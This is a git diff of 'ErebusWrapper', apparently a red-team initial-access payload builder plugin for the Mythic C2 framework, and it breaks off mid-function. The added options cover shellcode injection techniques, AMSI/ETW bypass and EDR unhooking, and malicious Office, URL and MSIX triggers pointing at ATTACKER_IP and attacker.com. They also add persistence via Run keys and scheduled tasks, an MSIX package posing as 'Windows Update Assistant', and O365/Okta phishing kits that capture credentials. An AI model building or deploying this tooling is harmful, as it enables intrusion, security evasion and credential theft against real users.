@@ -46,17 +46,23 @@ _REQUIRED_PLUGIN_FUNCTIONS = [
     "create_msi_payload_trigger", "create_clickonce_trigger",
     "create_msc_explorer_trigger", "create_html_smuggling_trigger",
     "create_clickfix_trigger",
-    "build_7z", "build_zip", "build_iso", "build_electron_installer",
+    "build_7z", "build_zip", "build_iso", "build_electron_installer", "build_vhd",
+    "build_appinstaller", "build_msix_structure",
     "self_sign_payload", "get_remote_cert_details", "sign_with_provided_cert",
     "generate_excel_payload", "backdoor_existing_excel",
     "generate_command_execution_vba",
     "generate_xll_template", "register_xll_function",
     "sanitize_pe", "generate_self_hunt_rules",
-    # R2a - shellcode_obfuscation helpers
     "build_obfuscation_cmd", "build_key_extraction_cmd", "build_raw_key_cmd",
     "parse_key_iv", "extract_raw_key_array",
-    # R2b - loader_config helper
     "build_loader_config_data",
+    "donut_convert", "donut_available",
+    "create_dotm_template_injection", "create_pptm_payload", "create_ppam_payload",
+    "create_chm_project",
+    "create_svg_smuggling_trigger",
+    "generate_redirector_configs",
+    "create_decoy_document",
+    "create_phishing_page",
 ]
 _missing = [n for n in _REQUIRED_PLUGIN_FUNCTIONS if n not in globals()]
 if _missing:
@@ -196,7 +202,6 @@ def parse_csv(value):
 
     Used across guardrail parameter extraction (Shellcode Loader, ClickOnce,
     DLL Hijack). Previously defined as two nested duplicates inside build()
-    - see the R1a refactor.
     """
     if not value or not isinstance(value, str):
         return []
@@ -313,7 +318,7 @@ DEFAULT_BLOCKED_PROCESSES = [
 class ErebusWrapper(PayloadType):
     name = "erebus_wrapper"
     author = "@Lavender-exe, @hunterino-sec"
-    semver = "v0.0.3"
+    semver = "v0.1.0"
     
     note = f"An Initial Access Toolkit built to speed up payload development & delivery.\nVersion: {semver}"
 
@@ -367,12 +372,69 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             description = (
                 "Raw shellcode blob to use instead of the Mythic-wrapped payload "
                 "(e.g. a .bin produced by msfvenom, CS payload generator, etc.). "
-                "Must be raw shellcode - PE files will be rejected."
             ),
             required = False,
             hide_conditions = [
                 HideCondition(name="0.0a Enable Custom Shellcode", operand=HideConditionOperand.EQ, value=False),
             ]
+        ),
+
+        BuildParameter(
+            name = "0.0c Enable Donut",
+            parameter_type = BuildParameterType.Boolean,
+            description = (
+                "Convert a PE (.exe/.dll) or .NET assembly to raw shellcode via Donut "
+                "before the obfuscation pipeline. Upload the PE via '0.0d Donut Input File'. "
+                "Requires donut-shellcode Python package (pip install donut-shellcode)."
+            ),
+            default_value = False,
+            required = False,
+        ),
+
+        BuildParameter(
+            name = "0.0d Donut Input File",
+            parameter_type = BuildParameterType.File,
+            description = "PE (.exe/.dll) or .NET assembly to convert to shellcode via Donut.",
+            required = False,
+            hide_conditions = [
+                HideCondition(name="0.0c Enable Donut", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.0e Donut Architecture",
+            parameter_type = BuildParameterType.ChooseOne,
+            description = "Target architecture for Donut shellcode generation.",
+            choices = ["x64", "x86", "x86+x64"],
+            default_value = "x64",
+            required = False,
+            hide_conditions = [
+                HideCondition(name="0.0c Enable Donut", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.0f Donut Args",
+            parameter_type = BuildParameterType.String,
+            description = "Optional command-line arguments passed to the Donut payload at runtime.",
+            default_value = "",
+            required = False,
+            hide_conditions = [
+                HideCondition(name="0.0c Enable Donut", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.0g Build All Configurations",
+            parameter_type = BuildParameterType.Boolean,
+            description = (
+                "Build all trigger types (BAT, HTA, HTML, ClickFix, URL, JS, CHM) and all container types "
+                "(Zip, 7z, ISO, VHD) from the compiled loader. Produces a master erebus_all_configs.zip "
+                "with one sub-archive per variant. Normal trigger/container selections are ignored. "
+                "Use as a build pipeline to validate all delivery mechanisms at once."
+            ),
+            default_value = False,
+            required = False,
         ),
 
         BuildParameter(
@@ -460,8 +522,11 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 2 = CreateFiber (Self)
 3 = EarlyCascade (Remote)
 4 = PoolParty (Remote)
-5 = NtQueueApcThread (Remote)""",
-            choices = ["1", "2", "3", "4", "5"],
+5 = NtQueueApcThread (Remote)
+6 = ModuleStomp (Self) - map legitimate DLL .text; VAD shows file-backed
+7 = KernelCallbackTable (Self) - overwrite PEB KCT entry, trigger via SendMessage
+8 = TxfHollow (Remote) - transacted NTFS ghost section; phantom VAD path""",
+            choices = ["1", "2", "3", "4", "5", "6", "7", "8"],
             default_value = "3",
             hide_conditions = [
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
@@ -476,6 +541,8 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             hide_conditions = [
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                 HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="2"),
+                HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="6"),
+                HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="7"),
             ]
         ),
 
@@ -656,7 +723,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         # Operator-selectable gadget host modules. InitCallstackSpoof() scans
         # each module's .text for `add rsp, 0x68; ret` (the disp is fixed by
         # callstack_spoof_gas.S's `sub rsp, 112`). Pick modules already mapped
-        # into the host process — defaults cover every Win32 process.
+        # into the host process - defaults cover every Win32 process.
         BuildParameter(
             name = "0.5o Callstack Spoof Modules",
             parameter_type = BuildParameterType.String,
@@ -673,6 +740,105 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                 HideCondition(name="0.2a Loader Architecture", operand=HideConditionOperand.EQ, value="x86"),
                 HideCondition(name="0.5n Callstack Spoofing", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        # Sleep Obfuscation Configuration
+        BuildParameter(
+            name = "0.5p Sleep Obfuscation",
+            parameter_type = BuildParameterType.ChooseOne,
+            description = (
+                "Pre-injection dwell mode.\n"
+                "None: no sleep (execute immediately).\n"
+                "Timer: WaitableTimer jittered dwell - bypasses sandbox Sleep() acceleration.\n"
+                "Ekko-lite: Timer + XOR-encrypt non-.text PE sections during wait (hides shellcode from memory scanners)."
+            ),
+            choices = ["None", "Timer", "Ekko-lite"],
+            default_value = "None",
+            required = False,
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.5q Sleep Base MS",
+            parameter_type = BuildParameterType.String,
+            description = "Base dwell in milliseconds before injection. Actual dwell = base + random(0, jitter).",
+            default_value = "5000",
+            required = False,
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
+                HideCondition(name="0.5p Sleep Obfuscation", operand=HideConditionOperand.EQ, value="None"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.5r Sleep Jitter MS",
+            parameter_type = BuildParameterType.String,
+            description = "Maximum random milliseconds added to the base dwell. Set to 0 for fixed dwell.",
+            default_value = "3000",
+            required = False,
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
+                HideCondition(name="0.5p Sleep Obfuscation", operand=HideConditionOperand.EQ, value="None"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.5s AMSI Bypass Type",
+            parameter_type = BuildParameterType.ChooseOne,
+            description = (
+                "AMSI bypass depth:\n"
+                "1 = Patch AmsiScanBuffer only (default)\n"
+                "2 = + Patch AmsiOpenSession\n"
+                "3 = + InvalidateAmsiContext (heap-walk, aggressive)"
+            ),
+            choices = ["1", "2", "3"],
+            default_value = "1",
+            required = False,
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.5t ETW Bypass Type",
+            parameter_type = BuildParameterType.ChooseOne,
+            description = (
+                "ETW bypass depth:\n"
+                "1 = Patch EtwEventWrite only (default)\n"
+                "2 = + Patch EtwEventWriteFull\n"
+                "3 = + UnregisterEtwProviders (TEB walk, aggressive)"
+            ),
+            choices = ["1", "2", "3"],
+            default_value = "1",
+            required = False,
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.5u Unhook Scope",
+            parameter_type = BuildParameterType.ChooseOne,
+            description = (
+                "DLL unhook breadth:\n"
+                "0 = ntdll only (default)\n"
+                "1 = ntdll + kernel32 + kernelbase\n"
+                "2 = Selective (targeted Nt* function list, lowest noise)"
+            ),
+            choices = ["0", "1", "2"],
+            default_value = "0",
+            required = False,
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
             ]
         ),
 
@@ -718,7 +884,7 @@ appdomain (self)""",
             name="0.9 Trigger Type",
             parameter_type=BuildParameterType.ChooseOne,
             description=f"Type of Trigger to toggle decoy and execution. LNK Unavailabe in {semver}",
-            choices=["LNK", "BAT", "MSI", "MSC", "HTML", "ClickFix"],
+            choices=["LNK", "BAT", "MSI", "MSC", "HTML", "ClickFix", "HTA", "URL", "JS", "CHM", "SVG"],
             default_value="BAT",
             required=False,
             hide_conditions = [
@@ -740,6 +906,7 @@ appdomain (self)""",
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="MSC"),
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="HTML"),
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickFix"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="URL"),
             ]
         ),
 
@@ -756,6 +923,7 @@ appdomain (self)""",
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="MSC"),
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="HTML"),
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickFix"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="URL"),
             ]
         ),
 
@@ -768,6 +936,24 @@ appdomain (self)""",
                 HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                 HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="ClickFix"),
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9d URL Target",
+            parameter_type=BuildParameterType.String,
+            description=(
+                "Target URL for the internet shortcut (.url) trigger.\n"
+                "SMB/UNC mode  (file://): file://ATTACKER_IP/share/payload.exe\n"
+                "  → Explorer opens the UNC path; Responder/relay captures NTLM.\n"
+                "WebDAV mode   (http://): http://ATTACKER_IP/payload.exe\n"
+                "  → Auto-mounts attacker WebDAV; executes payload from mapped drive.\n"
+            ),
+            default_value="file://ATTACKER_IP/share/payload.exe",
+            hide_conditions=[
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="URL"),
             ]
         ),
 
@@ -888,8 +1074,8 @@ appdomain (self)""",
         BuildParameter(
             name="0.9g VBA Loader Technique",
             parameter_type=BuildParameterType.ChooseOne,
-            description="VBA shellcode loader technique - VirtualAlloc (classic), EnumLocales (callback), QueueUserAPC (APC), ProcessHollowing (remote)",
-            choices=["VirtualAlloc + CreateThread", "EnumSystemLocalesA Callback", "QueueUserAPC Injection", "Process Hollowing"],
+            description="VBA shellcode loader technique - VirtualAlloc (classic), EnumLocales (callback), QueueUserAPC (APC), ProcessHollowing (remote), EarlyBird (suspended process hijack)",
+            choices=["VirtualAlloc + CreateThread", "EnumSystemLocalesA Callback", "QueueUserAPC Injection", "Process Hollowing", "Early-Bird Injection"],
             default_value="VirtualAlloc + CreateThread",
             required=False,
             hide_conditions=[
@@ -904,8 +1090,10 @@ appdomain (self)""",
         BuildParameter(
             name="0.9h XLL Payload Type",
             parameter_type=BuildParameterType.ChooseOne,
-            description="Generate XLL (Excel Add-In DLL) instead of VBA macro - native DLL executed when Excel loads",
-            choices=["VBA Macro", "XLL Add-In DLL"],
+            description="Generate VBA Macro or XLL Add-In DLL for Excel-based payload delivery (MOVED TO SEPARATE PARAMETER)",
+            choices=["VBA Macro",
+                    #   "XLL Add-In DLL"
+                      ],
             default_value="VBA Macro",
             required=False,
             hide_conditions=[
@@ -915,19 +1103,19 @@ appdomain (self)""",
             ]
         ),
 
-        BuildParameter(
-            name="0.9i XLL Injection Method",
-            parameter_type=BuildParameterType.ChooseOne,
-            description="Shellcode injection technique for XLL DLL - CreateThread (self), ProcessInject (remote)",
-            choices=["CreateThread (In-Process)", "ProcessInject (Remote)"],
-            default_value="CreateThread (In-Process)",
-            required=False,
-            hide_conditions=[
-                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
-                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
-                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
-            ]
-        ),
+        # BuildParameter(
+        #     name="0.9i XLL Injection Method",
+        #     parameter_type=BuildParameterType.ChooseOne,
+        #     description="Shellcode injection technique for XLL DLL - CreateThread (self), ProcessInject (remote)",
+        #     choices=["CreateThread (In-Process)", "ProcessInject (Remote)"],
+        #     default_value="CreateThread (In-Process)",
+        #     required=False,
+        #     hide_conditions=[
+        #         HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
+        #         HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
+        #         HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
+        #     ]
+        # ),
 
         BuildParameter(
             name="0.9j XLL Target Process",
@@ -1013,18 +1201,36 @@ appdomain (self)""",
             parameter_type=BuildParameterType.ChooseOne,
             description=(
                 "Output format for the VBA maldoc. "
-                "All formats require erebus_helper on a Windows host (deferred via build_maldoc.bat). "
-                "xlsm: macro-enabled workbook. xlsx: workbook saved as xlsm. xlam: Excel add-in. "
-                "docm: Word macro-enabled document (Open XML). "
-                "doc: Word 97-2003 binary format (build_maldoc.bat converts from docm via Word COM)."
+                "xlsm/xlsx/xlam: Excel formats (require erebus_helper on Windows). "
+                "docm/doc: Word formats. "
+                "pptm: PowerPoint macro-enabled presentation (pure Python). "
+                "ppam: PowerPoint Add-In - persists in AddIns list, re-executes on every PowerPoint launch. "
+                "docx-remote-template: clean DOCX that fetches attacker DOTM on open (no macros in attachment)."
             ),
-            choices=["xlsm", "xlsx", "xlam", "docm", "doc"],
+            choices=["xlsm", "xlsx", "xlam", "docm", "doc", "pptm", "ppam", "docx-remote-template"],
             default_value="xlsm",
             required=False,
             hide_conditions=[
                 HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                 HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.NotEQ, value="VBA Macro"),
                 HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9q DOTM Remote URL",
+            parameter_type=BuildParameterType.String,
+            description=(
+                "URL of the attacker-hosted DOTM template fetched by Word on Document_Open. "
+                "Only used when MalDoc Output Format = docx-remote-template. "
+                "Example: https://cdn.attacker.com/template.dotm"
+            ),
+            default_value="https://attacker.com/template.dotm",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
+                HideCondition(name="0.9p MalDoc Output Format", operand=HideConditionOperand.NotEQ, value="docx-remote-template"),
             ]
         ),
 
@@ -1268,9 +1474,67 @@ generated if none have been entered.""",
         BuildParameter(
             name = "3.0 Container Type",
             parameter_type = BuildParameterType.ChooseOne,
-            description = "Choose the final payload container type.",
-            choices = ["ISO", "7z", "Zip", "MSI", "Electron"],
+            description = (
+                "Primary container / execution layer.\n"
+                "Electron and MSI extract and launch the payload automatically on open.\n"
+                "ISO, VHD, ZIP, and 7z are transport containers that expose the payload file.\n"
+                "Combine with '3.0T Outer Transport' to chain (e.g. Electron inside ISO)."
+            ),
+            choices = ["ISO", "7z", "Zip", "MSI", "Electron", "VHD", "AppInstaller"],
             default_value = "Zip",
+        ),
+
+        BuildParameter(
+            name = "3.0T Outer Transport",
+            parameter_type = BuildParameterType.ChooseOne,
+            description = (
+                "Optional outer transport wrapper. Wraps the primary container inside an\n"
+                "additional archive or disk image AFTER it is built.\n\n"
+                "Useful chains:\n"
+                "  Electron → ISO  : ISO disc containing setup.exe (MOTW bypass)\n"
+                "  Electron → VHD  : VHD disc containing setup.exe (ISO-policy bypass)\n"
+                "  MSI     → ISO  : ISO disc containing installer.msi\n"
+                "  MSI     → VHD  : VHD disc containing installer.msi\n"
+                "  Zip     → ISO  : ISO containing a ZIP archive\n"
+                "Set to 'None' for no outer wrapping (default)."
+            ),
+            choices = ["None", "ISO", "VHD", "ZIP", "7z"],
+            default_value = "None",
+        ),
+
+        BuildParameter(
+            name="3.AI0 MSIX Hosting URL",
+            parameter_type=BuildParameterType.String,
+            description=(
+                "Full HTTPS URL where the operator will host the signed MSIX package.\n"
+                "Example: https://cdn.yourdomain.com/update/app.msix\n"
+                "Erebus generates the package structure; run build_msix.bat on Windows\n"
+                "to sign it, then upload to this URL before delivering .appinstaller."
+            ),
+            default_value="https://ATTACKER_HOST/update/app.msix",
+            hide_conditions=[
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="AppInstaller"),
+            ]
+        ),
+
+        BuildParameter(
+            name="3.AI1 MSIX Package Name",
+            parameter_type=BuildParameterType.String,
+            description="MSIX identity package name. Shown in Settings > Apps. No spaces.",
+            default_value="Microsoft.WindowsUpdate",
+            hide_conditions=[
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="AppInstaller"),
+            ]
+        ),
+
+        BuildParameter(
+            name="3.AI2 MSIX Display Name",
+            parameter_type=BuildParameterType.String,
+            description="Friendly display name shown in App Installer UI and Settings > Apps.",
+            default_value="Windows Update Assistant",
+            hide_conditions=[
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="AppInstaller"),
+            ]
         ),
 
         # Electron fake-installer container parameters (hidden unless Electron selected)
@@ -1626,6 +1890,9 @@ generated if none have been entered.""",
             hide_conditions = [
                 HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="ISO"),
                 HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="VHD"),
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="Electron"),
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="AppInstaller"),
             ]
         ),
 
@@ -1638,6 +1905,75 @@ generated if none have been entered.""",
             hide_conditions = [
                 HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="ISO"),
                 HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="VHD"),
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="Electron"),
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="AppInstaller"),
+
+            ]
+        ),
+
+        # Electron persistence parameters
+        BuildParameter(
+            name = "3.P0 Enable Persistence",
+            parameter_type = BuildParameterType.Boolean,
+            description = (
+                "Copy the loader to a permanent location and register a persistence mechanism "
+                "so it survives reboot. The copy is made BEFORE the loader is spawned.\n\n"
+                "Supported methods (select via 3.P1):\n"
+                "  Registry Run Key   — HKCU\\...\\Run (every login)\n"
+                "  Registry RunOnce   — HKCU\\...\\RunOnce (next login only)\n"
+                "  Startup Folder     — %APPDATA%\\...\\Startup\\\n"
+                "  Scheduled Task     — schtasks /sc onlogon /rl limited"
+            ),
+            default_value = False,
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+            ]
+        ),
+        BuildParameter(
+            name = "3.P1 Persistence Method",
+            parameter_type = BuildParameterType.ChooseOne,
+            description = (
+                "Persistence mechanism to register after install:\n"
+                "  Registry Run Key   — HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n"
+                "  Registry RunOnce   — same key but RunOnce (single invocation)\n"
+                "  Startup Folder     — copies loader/BAT wrapper to shell:startup\n"
+                "  Scheduled Task     — schtasks /create /sc onlogon /rl limited"
+            ),
+            choices = ["Registry Run Key", "Registry RunOnce", "Startup Folder", "Scheduled Task"],
+            default_value = "Registry Run Key",
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+                HideCondition(name="3.P0 Enable Persistence", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+        BuildParameter(
+            name = "3.P2 Persistence Name",
+            parameter_type = BuildParameterType.String,
+            description = (
+                "Registry value name, scheduled task name, and install subdirectory name "
+                "used for the persisted entry. Defaults to the Electron product name when empty."
+            ),
+            default_value = "",
+            required = False,
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+                HideCondition(name="3.P0 Enable Persistence", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+        BuildParameter(
+            name = "3.P3 Persistence Install Dir",
+            parameter_type = BuildParameterType.ChooseOne,
+            description = (
+                "Base directory where the loader is copied before persistence is registered.\n"
+                "  %APPDATA%      — C:\\Users\\<user>\\AppData\\Roaming\\<name>\\\n"
+                "  %LOCALAPPDATA% — C:\\Users\\<user>\\AppData\\Local\\<name>\\"
+            ),
+            choices = ["%APPDATA%", "%LOCALAPPDATA%"],
+            default_value = "%APPDATA%",
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+                HideCondition(name="3.P0 Enable Persistence", operand=HideConditionOperand.EQ, value=False),
             ]
         ),
 
@@ -1868,6 +2204,177 @@ generated if none have been entered.""",
             ]
         ),
 
+        # ── Redirector Config Generator ───────────────────────────────────────
+        BuildParameter(
+            name="7.0 Generate Redirector Configs",
+            parameter_type=BuildParameterType.Boolean,
+            description=(
+                "Generate C2 redirector configs (Apache .htaccess, Nginx block, Caddyfile, Terraform stub) "
+                "matching the C2 profile. Output is bundled into the final artifact ZIP alongside the payload."
+            ),
+            default_value=False,
+            required=False,
+        ),
+
+        BuildParameter(
+            name="7.1 Redirector Team Server URL",
+            parameter_type=BuildParameterType.String,
+            description="Full URL of the hidden team server (e.g. https://10.0.0.5:8443). Never exposed to the public.",
+            default_value="https://10.0.0.5:8443",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="7.0 Generate Redirector Configs", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
+            name="7.2 Redirector Public Domain",
+            parameter_type=BuildParameterType.String,
+            description="Public hostname of the redirector (e.g. cdn.legitimate-looking.com). Used in Nginx/Caddy configs.",
+            default_value="cdn.example.com",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="7.0 Generate Redirector Configs", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
+            name="7.3 Redirector Decoy URL",
+            parameter_type=BuildParameterType.String,
+            description="Catch-all 302 target for non-matching traffic. Pick a plausible site matching the redirector domain theme.",
+            default_value="https://www.microsoft.com/en-us/",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="7.0 Generate Redirector Configs", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        # ── Decoy Document Generator ──────────────────────────────────────────
+        BuildParameter(
+            name="8.0 Generate Decoy Document",
+            parameter_type=BuildParameterType.Boolean,
+            description=(
+                "Generate a lure document (DOCX/XLSX) placed alongside the payload. "
+                "Open this file in the loader's background thread to display plausible content to the victim."
+            ),
+            default_value=False,
+            required=False,
+        ),
+
+        BuildParameter(
+            name="8.1 Decoy Template",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Lure document theme: invoice, hr_policy, job_offer, it_notice, nda",
+            choices=["invoice", "hr_policy", "job_offer", "it_notice", "nda"],
+            default_value="invoice",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="8.0 Generate Decoy Document", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
+            name="8.2 Decoy Company Name",
+            parameter_type=BuildParameterType.String,
+            description="Company name shown in the decoy document header / letterhead.",
+            default_value="Acme Corporation",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="8.0 Generate Decoy Document", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
+            name="8.3 Decoy Recipient",
+            parameter_type=BuildParameterType.String,
+            description="Addressee name used in salutations and 'Bill To' fields.",
+            default_value="Valued Employee",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="8.0 Generate Decoy Document", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
+            name="8.4 Decoy Format",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Output format for the decoy document (xlsx only available for invoice template).",
+            choices=["docx", "xlsx"],
+            default_value="docx",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="8.0 Generate Decoy Document", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        # ── Phishing Page Generator ───────────────────────────────────────────
+        BuildParameter(
+            name="9.0 Generate Phishing Page",
+            parameter_type=BuildParameterType.Boolean,
+            description=(
+                "Generate a phishing page kit (HTML + PHP/Python capture backend) "
+                "bundled into the final artifact ZIP."
+            ),
+            default_value=False,
+            required=False,
+        ),
+
+        BuildParameter(
+            name="9.1 Phishing Template",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Portal to spoof: o365, sharepoint, docusign, adfs, okta",
+            choices=["o365", "sharepoint", "docusign", "adfs", "okta"],
+            default_value="o365",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="9.0 Generate Phishing Page", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
+            name="9.2 Phishing Org Name",
+            parameter_type=BuildParameterType.String,
+            description="Organization name shown in the phishing page header.",
+            default_value="Acme Corporation",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="9.0 Generate Phishing Page", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
+            name="9.3 Phishing Domain",
+            parameter_type=BuildParameterType.String,
+            description="Email domain shown as placeholder in login forms (e.g. acme.com).",
+            default_value="acme.com",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="9.0 Generate Phishing Page", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
+            name="9.4 Phishing Redirect URL",
+            parameter_type=BuildParameterType.String,
+            description="URL to redirect victim to after credential capture (e.g. the real O365 portal).",
+            default_value="https://www.office.com",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="9.0 Generate Phishing Page", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
+            name="9.5 GoPhish Webhook",
+            parameter_type=BuildParameterType.String,
+            description="Optional GoPhish campaign webhook URL. Captured credentials are also POSTed here.",
+            default_value="",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="9.0 Generate Phishing Page", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
 ]
 
     build_steps = [
@@ -1918,6 +2425,15 @@ generated if none have been entered.""",
 
         BuildStep(step_name = "[T1027] - Containerising",
                   step_description = "Adding payload into chosen container"),
+
+        BuildStep(step_name = "[T1090.002] - Redirector Configs",
+                  step_description = "Generating Apache/Nginx/Caddy/Terraform redirector configs"),
+
+        BuildStep(step_name = "[T1566.001] - Decoy Document",
+                  step_description = "Generating branded lure document for victim display"),
+
+        BuildStep(step_name = "[T1566.002] - Phishing Kit",
+                  step_description = "Generating phishing page kit with credential capture backend"),
     ]
 
     def calculate_sha256(self, file_path: str) -> str:
@@ -2105,6 +2621,102 @@ generated if none have been entered.""",
         except Exception as e:
             print(f"[!] Failed to generate IOCs file: {str(e)}")
 
+    def generate_attack_coverage(self, output_path: str) -> None:
+        """Write ATT&CK technique coverage file based on current build parameters."""
+        # Map: (param_name, value_or_True) → [(technique_id, technique_name)]
